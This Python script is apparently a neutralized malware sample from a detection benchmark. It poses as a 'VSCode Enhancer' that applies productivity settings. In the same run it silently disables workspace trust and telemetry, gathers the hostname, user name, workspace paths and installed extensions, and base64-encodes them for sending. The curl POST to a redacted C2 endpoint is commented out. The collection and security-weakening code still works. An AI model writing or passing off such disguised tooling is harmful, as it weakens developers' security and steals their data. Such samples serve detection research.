#!/usr/bin/env python3
"""
VSCode Enhancer - Settings Configurator
BENCHMARK_TEST_ONLY - Neutralized malicious sample
"""

import os
import json
import base64
from pathlib import Path

# VSCode settings paths
VSCODE_USER_DIR = Path.home() / "Library/Application Support/Code/User"
SETTINGS_FILE = VSCODE_USER_DIR / "settings.json"

# [REDACTED] C2 endpoint
C2_ENDPOINT = "[REDACTED_C2_URL]"

def load_settings():
    """Load existing VSCode settings"""
    if SETTINGS_FILE.exists():
        with open(SETTINGS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_settings(settings):
    """Save VSCode settings"""
    VSCODE_USER_DIR.mkdir(parents=True, exist_ok=True)
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=4)

def apply_productivity_settings():
    """Apply productivity-enhancing settings"""
    settings = load_settings()

    # Legitimate settings
    settings.update({
        "editor.formatOnSave": True,
        "editor.minimap.enabled": True,
        "editor.bracketPairColorization.enabled": True,
        "workbench.colorTheme": "One Dark Pro"
    })

    # [REDACTED] - Disable security features
    settings.update({
        "security.workspace.trust.enabled": False,
        "telemetry.telemetryLevel": "off"  # Hide our telemetry
    })

    save_settings(settings)

def collect_recent_files():
    """[REDACTED] - Collect recently opened files and workspaces"""
    state_file = VSCODE_USER_DIR / "globalStorage/state.vscdb"
    recent_files = []

    # Also check workspace storage
    workspace_storage = VSCODE_USER_DIR / "workspaceStorage"
    if workspace_storage.exists():
        for ws in workspace_storage.iterdir():
            ws_json = ws / "workspace.json"
            if ws_json.exists():
                with open(ws_json, 'r') as f:
                    recent_files.append(f.read())

    return recent_files

def collect_extensions():
    """[REDACTED] - Collect installed extension information"""
    ext_dir = Path.home() / ".vscode/extensions"
    extensions = []

    if ext_dir.exists():
        for ext in ext_dir.iterdir():
            pkg_json = ext / "package.json"
            if pkg_json.exists():
                with open(pkg_json, 'r') as f:
                    extensions.append(json.load(f))

    return extensions

def exfiltrate_data():
    """[REDACTED] - Send collected data to C2"""
    payload = {
        "hostname": os.uname().nodename,
        "user": os.environ.get("USER"),
        "settings": load_settings(),
        "recent": collect_recent_files(),
        "extensions": collect_extensions()
    }

    # [REDACTED] - HTTP exfiltration
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    # subprocess.run(['curl', '-s', '-X', 'POST', '-d', encoded, C2_ENDPOINT])

if __name__ == "__main__":
    apply_productivity_settings()
    exfiltrate_data()
